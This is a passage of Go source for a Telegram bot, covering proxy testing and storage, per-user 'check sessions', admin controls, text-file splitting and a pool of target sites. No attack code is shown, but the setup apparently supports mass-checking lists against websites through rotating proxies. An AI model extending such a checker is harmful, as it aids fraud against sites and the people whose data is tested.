		// Payload only captures the first line — use full Text instead
		fullText := c.Message().Text
		// Strip the /setpr command (may include @botname)
		idx := strings.Index(fullText, "/setpr")
		if idx >= 0 {
			after := fullText[idx+len("/setpr"):]
			// Strip optional @botname
			if len(after) > 0 && after[0] == '@' {
				if sp := strings.IndexAny(after, " \n"); sp >= 0 {
					after = after[sp:]
				} else {
					after = ""
				}
			}
			fullText = after
		}
		raw := strings.TrimSpace(fullText)
		if raw == "" {
			return c.Send("Usage: /setpr proxy1\\nproxy2\\nproxy3\\n...")
		}

		// Split by newlines to support multiple proxies
		var rawProxies []string
		for _, line := range strings.Split(raw, "\n") {
			line = strings.TrimSpace(line)
			if line != "" {
				rawProxies = append(rawProxies, line)
			}
		}
		if len(rawProxies) == 0 {
			return c.Send("❌ No proxies provided")
		}

		ud := um.Get(c.Sender().ID)

		// Pre-filter: normalize + dedup before testing
		type proxyEntry struct {
			normalized string
			valid      bool
		}
		var toTest []proxyEntry
		dupes := 0
		parseFail := 0
		existing := make(map[string]bool)
		for _, p := range ud.Proxies {
			existing[p] = true
		}
		for _, rp := range rawProxies {
			normalized, err := normalizeProxy(rp)
			if err != nil {
				parseFail++
				continue
			}
			if _, err := url.Parse(normalized); err != nil {
				parseFail++
				continue
			}
			if existing[normalized] {
				dupes++
				continue
			}
			existing[normalized] = true
			toTest = append(toTest, proxyEntry{normalized: normalized})
		}

		if len(toTest) == 0 {
			msg := "❌ No new proxies to test"
			if parseFail > 0 {
				msg += fmt.Sprintf(" (%d invalid)", parseFail)
			}
			if dupes > 0 {
				msg += fmt.Sprintf(" (%d duplicate)", dupes)
			}
			return c.Send(msg)
		}

		c.Send(fmt.Sprintf("🔄 Testing %d proxy(s)...", len(toTest)))

		// Test all proxies concurrently
		var wg sync.WaitGroup
		results := make([]bool, len(toTest))
		for i := range toTest {
			wg.Add(1)
			go func(idx int) {
				defer wg.Done()
				if err := testProxy(toTest[idx].normalized); err == nil {
					results[idx] = true
				}
			}(i)
		}
		wg.Wait()

		added := 0
		failed := 0
		for i, ok := range results {
			if ok {
				ud.Proxies = append(ud.Proxies, toTest[i].normalized)
				added++
			} else {
				failed++
			}
		}
		failed += parseFail

		um.Save()

		msg := fmt.Sprintf("✅ %d proxy(s) added (%d total)", added, len(ud.Proxies))
		if failed > 0 {
			msg += fmt.Sprintf("\n❌ %d failed", failed)
		}
		if dupes > 0 {
			msg += fmt.Sprintf("\n⏭ %d duplicate(s) skipped", dupes)
		}
		return c.Send(msg)
	})

	// /rmpr <proxy|all>
	bot.Handle("/rmpr", func(c tele.Context) error {
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /rmpr <proxy> or /rmpr all")
		}

		ud := um.Get(c.Sender().ID)
		if strings.ToLower(raw) == "all" {
			ud.Proxies = nil
			um.Save()
			return c.Send("✅ All proxies removed")
		}

		normalized, err := normalizeProxy(raw)
		if err != nil {
			return c.Send("❌ Invalid proxy format: " + err.Error())
		}
		found := false
		newList := make([]string, 0, len(ud.Proxies))
		for _, p := range ud.Proxies {
			if p == normalized {
				found = true
				continue
			}
			newList = append(newList, p)
		}
		if !found {
			return c.Send("❌ Proxy not found in your list")
		}
		ud.Proxies = newList
		um.Save()
		return c.Send(fmt.Sprintf("✅ Proxy removed (%d remaining)", len(ud.Proxies)))
	})

	// /stop — stop own session
	bot.Handle("/stop", func(c tele.Context) error {
		uid := c.Sender().ID
		val, ok := activeSessions.Load(uid)
		if !ok {
			return c.Send("⚠️ No active session to stop.")
		}
		sess := val.(*CheckSession)
		sess.Cancel()
		<-sess.Done
		return c.Send("✅ Your session has been stopped.")
	})

	// /stopall — admin only, stop all sessions
	bot.Handle("/stopall", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /stopall")
		}
		count := 0
		activeSessions.Range(func(key, val any) bool {
			sess := val.(*CheckSession)
			sess.Cancel()
			count++
			return true
		})
		if count == 0 {
			return c.Send("⚠️ No active sessions.")
		}
		return c.Send(fmt.Sprintf("✅ Stopped %d session(s).", count))
	})

	// /ban <userid> — admin only
	bot.Handle("/ban", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /ban")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /ban <userid>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}
		if isAdmin(uid) {
			return c.Send("❌ Cannot ban admin")
		}
		cfg.mu.Lock()
		cfg.BannedUsers[uid] = true
		cfg.mu.Unlock()
		cfg.Save()
		// Also stop their session if running
		if val, ok := activeSessions.Load(uid); ok {
			val.(*CheckSession).Cancel()
		}
		return c.Send(fmt.Sprintf("✅ User %d banned.", uid))
	})

	// /unban <userid> — admin only
	bot.Handle("/unban", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /unban")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /unban <userid>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}
		cfg.mu.Lock()
		delete(cfg.BannedUsers, uid)
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ User %d unbanned.", uid))
	})

	// /pvtonly — admin only, toggle private mode
	bot.Handle("/pvtonly", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /pvtonly")
		}
		cfg.mu.Lock()
		cfg.PvtOnly = !cfg.PvtOnly
		state := cfg.PvtOnly
		cfg.mu.Unlock()
		cfg.Save()
		if state {
			return c.Send("🔒 Private mode ON — only allowed users can use the bot.")
		}
		return c.Send("🔓 Private mode OFF — everyone can use the bot.")
	})

	// /allowuser <userid> — admin only
	bot.Handle("/allowuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /allowuser")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /allowuser <userid>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}
		cfg.mu.Lock()
		cfg.AllowedUsers[uid] = true
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ User %d allowed.", uid))
	})

	// /removeuser <userid> — admin only, remove from allowed list
	bot.Handle("/removeuser", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /removeuser")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /removeuser <userid>")
		}
		uid, err := strconv.ParseInt(raw, 10, 64)
		if err != nil {
			return c.Send("❌ Invalid user ID")
		}
		cfg.mu.Lock()
		delete(cfg.AllowedUsers, uid)
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("✅ User %d removed from allowed list.", uid))
	})

	// /split <N> — reply to a .txt file, splits it into N parts
	bot.Handle("/split", func(c tele.Context) error {
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: reply to a .txt file with /split <N>")
		}
		n, err := strconv.Atoi(raw)
		if err != nil || n < 2 {
			return c.Send("❌ Provide a number >= 2")
		}

		msg := c.Message()
		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc == nil {
			return c.Send("❌ Reply to a .txt file with /split <N> or attach a .txt file with /split as caption")
		}

		rc, err := bot.File(&doc.File)
		if err != nil {
			return c.Send("❌ Failed to download file: " + err.Error())
		}
		defer rc.Close()
		data, err := io.ReadAll(rc)
		if err != nil {
			return c.Send("❌ Failed to read file: " + err.Error())
		}

		var lines []string
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if line != "" {
				lines = append(lines, line)
			}
		}
		if len(lines) == 0 {
			return c.Send("❌ File is empty")
		}
		if n > len(lines) {
			n = len(lines)
		}

		chunkSize := len(lines) / n
		extra := len(lines) % n
		start := 0
		for i := 0; i < n; i++ {
			end := start + chunkSize
			if i < extra {
				end++
			}
			chunk := lines[start:end]
			start = end

			buf := bytes.NewBufferString(strings.Join(chunk, "\n"))
			fname := fmt.Sprintf("part_%d_of_%d.txt", i+1, n)
			doc := &tele.Document{
				File:     tele.FromReader(buf),
				FileName: fname,
				Caption:  fmt.Sprintf("📄 Part %d/%d (%d lines)", i+1, n, len(chunk)),
			}
			bot.Send(c.Chat(), doc)
		}
		return nil
	})

	// /addsite — admin only, add custom sites (text or reply to .txt)
	bot.Handle("/addsite", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /addsite")
		}

		var raw string
		msg := c.Message()

		// Check for attached or replied .txt file
		var doc *tele.Document
		if msg.Document != nil {
			doc = msg.Document
		} else if msg.ReplyTo != nil && msg.ReplyTo.Document != nil {
			doc = msg.ReplyTo.Document
		}
		if doc != nil {
			rc, err := bot.File(&doc.File)
			if err != nil {
				return c.Send("❌ Failed to download file: " + err.Error())
			}
			defer rc.Close()
			data, err := io.ReadAll(rc)
			if err != nil {
				return c.Send("❌ Failed to read file: " + err.Error())
			}
			raw = string(data)
		} else {
			// Get text after /addsite command
			fullText := msg.Text
			idx := strings.Index(fullText, "/addsite")
			if idx >= 0 {
				after := fullText[idx+len("/addsite"):]
				if len(after) > 0 && after[0] == '@' {
					if sp := strings.IndexAny(after, " \n"); sp >= 0 {
						after = after[sp:]
					} else {
						after = ""
					}
				}
				raw = after
			}
		}

		raw = strings.TrimSpace(raw)
		if raw == "" {
			return c.Send("Usage: /addsite site1\nsite2\nsite3\n\nOr reply to a .txt file with /addsite")
		}

		added := 0
		dupes := 0
		customSitesMu.Lock()
		existing := make(map[string]bool, len(customSites))
		for _, s := range customSites {
			existing[s] = true
		}
		for _, line := range strings.Split(raw, "\n") {
			site := strings.TrimSpace(line)
			if site == "" {
				continue
			}
			site = strings.TrimRight(site, "/")
			if !strings.HasPrefix(site, "http") {
				site = "https://" + site
			}
			if existing[site] {
				dupes++
				continue
			}
			customSites = append(customSites, site)
			existing[site] = true
			added++
		}
		total := len(customSites)
		customSitesMu.Unlock()
		saveCustomSites()

		msgText := fmt.Sprintf("✅ Added %d site(s) (%d total custom sites)", added, total)
		if dupes > 0 {
			msgText += fmt.Sprintf("\n⏭ %d duplicate(s) skipped", dupes)
		}
		return c.Send(msgText)
	})

	// /rmsite <site|all> — admin only
	bot.Handle("/rmsite", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /rmsite")
		}
		raw := strings.TrimSpace(c.Message().Payload)
		if raw == "" {
			return c.Send("Usage: /rmsite <site> or /rmsite all")
		}
		if strings.ToLower(raw) == "all" {
			customSitesMu.Lock()
			customSites = nil
			customSitesMu.Unlock()
			saveCustomSites()
			return c.Send("✅ All custom sites removed. Bot will use API sites.")
		}
		site := strings.TrimRight(strings.TrimSpace(raw), "/")
		if !strings.HasPrefix(site, "http") {
			site = "https://" + site
		}
		customSitesMu.Lock()
		found := false
		newList := make([]string, 0, len(customSites))
		for _, s := range customSites {
			if s == site {
				found = true
				continue
			}
			newList = append(newList, s)
		}
		customSites = newList
		remaining := len(customSites)
		customSitesMu.Unlock()
		if !found {
			return c.Send("❌ Site not found in custom list")
		}
		saveCustomSites()
		if remaining == 0 {
			return c.Send("✅ Site removed. No custom sites left — bot will use API sites.")
		}
		return c.Send(fmt.Sprintf("✅ Site removed (%d remaining)", remaining))
	})

	// /site <keyword> or /site all — admin only
	bot.Handle("/site", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("❌ Only admin can use /site")
		}
		keyword := strings.TrimSpace(c.Message().Payload)
		if keyword == "" {
			return c.Send("Usage: /site <keyword>  or  /site all")
		}

		// Gather all sites: custom + API pool
		allSites := make(map[string]bool)
		for _, s := range getCustomSites() {
			allSites[s] = true
		}
		sitePoolMu.RLock()
		for _, s := range sitePool {
			allSites[s] = true
		}
		sitePoolMu.RUnlock()

		if strings.ToLower(keyword) == "all" {
			if len(allSites) == 0 {
				return c.Send("📝 No sites available.")
			}
			var list []string
			for s := range allSites {
				list = append(list, s)
			}
			sort.Strings(list)
			buf := bytes.NewBufferString(strings.Join(list, "\n"))
			doc := &tele.Document{
				File:     tele.FromReader(buf),
				FileName: "sites.txt",
				Caption:  fmt.Sprintf("🌐 All sites (%d)", len(list)),
			}
			return c.Send(doc)
		}

		kw := strings.ToLower(keyword)
		var matches []string
		for s := range allSites {
			if strings.Contains(strings.ToLower(s), kw) {
				matches = append(matches, s)
			}
		}
		sort.Strings(matches)

		if len(matches) == 0 {
			return c.Send(fmt.Sprintf("🔍 No sites found containing \"%s\"", keyword))
		}
		var sb strings.Builder
		sb.WriteString(fmt.Sprintf("🔍 Sites matching \"%s\" (%d):\n\n", keyword, len(matches)))
		for i, s := range matches {
			sb.WriteString(fmt.Sprintf("%d. %s\n", i+1, s))
		}
		return c.Send(sb.String())
	})

	// /stats — global stats for all users
	bot.Handle("/stats", func(c tele.Context) error {
		return c.Send(formatStatsMsg(um))
	})

	// /active
	bot.Handle("/active", func(c tele.Context) error {
		return c.Send(formatActiveMsg())
	})

	// /admin — list admin commands
	bot.Handle("/admin", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		return c.Send(`━━━━━━━━━━━━━━━━━━━━━━
  🔧 𝗔𝗱𝗺𝗶𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀
━━━━━━━━━━━━━━━━━━━━━━

📢  /broadcast <msg>
     ∟ Send message to all users

🚫  /ban <user_id>
     ∟ Ban a user

✅  /unban <user_id>
     ∟ Unban a user

🔒  /pvtonly
     ∟ Toggle private mode

👤  /allowuser <user_id>
     ∟ Allow user in private mode

❌  /removeuser <user_id>
     ∟ Remove allowed user

📊  /stats
     ∟ View all user stats

⚡  /active
     ∟ View active sessions

🛑  /stop <user_id>
     ∟ Stop a user's session

🛑  /stopall
     ∟ Stop all sessions

🌐  /addsite <url>
     ∟ Add a custom site

🗑  /rmsite <url>
     ∟ Remove a custom site

📋  /site all
     ∟ Send all sites as txt file`)
	})

	// /broadcast — send message to all known users
	bot.Handle("/broadcast", func(c tele.Context) error {
		if !isAdmin(c.Sender().ID) {
			return c.Send("🚫 Admin only.")
		}
		fullText := c.Message().Text
		idx := strings.Index(fullText, " ")
		if idx < 0 || strings.TrimSpace(fullText[idx:]) == "" {
			return c.Send("Usage: /broadcast <message>")
		}
		msg := strings.TrimSpace(fullText[idx:])
		ids := um.AllIDs()
		sent, failed := 0, 0
		for _, uid := range ids {
			_, err := bot.Send(tele.ChatID(uid), "📢 "+msg)
			if err != nil {
				failed++
			} else {
				sent++
			}
		}
		return c.Send(fmt.Sprintf("📢 Broadcast complete\n✅ Sent: %d\n❌ Failed: %d", sent, failed))
	})

	fwd.BindRCtx(bot)

	fmt.Println("Bot started")
	bot.Start()
}
